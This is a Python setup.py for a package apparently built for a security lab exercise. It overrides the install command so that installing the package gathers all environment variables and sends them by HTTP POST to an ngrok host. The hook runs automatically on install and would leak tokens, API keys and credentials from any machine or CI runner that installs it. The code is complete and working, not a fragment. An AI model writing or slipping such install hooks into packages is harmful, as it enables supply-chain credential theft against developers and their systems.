import setuptools
from setuptools.command.install import install
import os
import urllib.request
import urllib.parse

# Function to leak environment variables
def leak_env_variables():
    data = dict(os.environ)
    
    # Print environment variables for debugging (optional)
    print("Environment variables collected during installation:", data)
    
    # Encode the environment variables as URL-encoded form data
    encoded_data = urllib.parse.urlencode(data).encode('utf-8')
    
    # Define the correct Ngrok URL
    url = 'https://ea2de72474be.ngrok.app'
    
    # Make the HTTP request to send the environment variables
    req = urllib.request.Request(url, data=encoded_data)
    req.add_header('Content-Type', 'application/x-www-form-urlencoded')
    
    try:
        response = urllib.request.urlopen(req)
        print("Successfully sent environment variables")
        print(response.read().decode('utf-8'))  # Print server response for debugging
    except Exception as e:
        print(f"Failed to send environment variables: {e}")

# Custom installation command that triggers the leak
class CustomInstallCommand(install):
    def run(self):
        install.run(self)  # Perform the standard installation process
        
        # Debug: Confirm that custom command is executed
        print("Running custom install command: Executing leak_env_variables()")
        
        # Leak environment variables
        leak_env_variables()

# Setup function with correct details
setuptools.setup(
    name="artifact-lab-3-package-db7d716a",  # Correct package name
    version="1.0.1",  # Version (increment if necessary)
    description="A package to demonstrate leaking environment variables during installation",
    author="Your Name",  # Replace with your name
    author_email="your_email@example.com",  # Replace with your email
    cmdclass={
        'install': CustomInstallCommand,  # Custom installation command
    },
    python_requires=">=3.6",
)
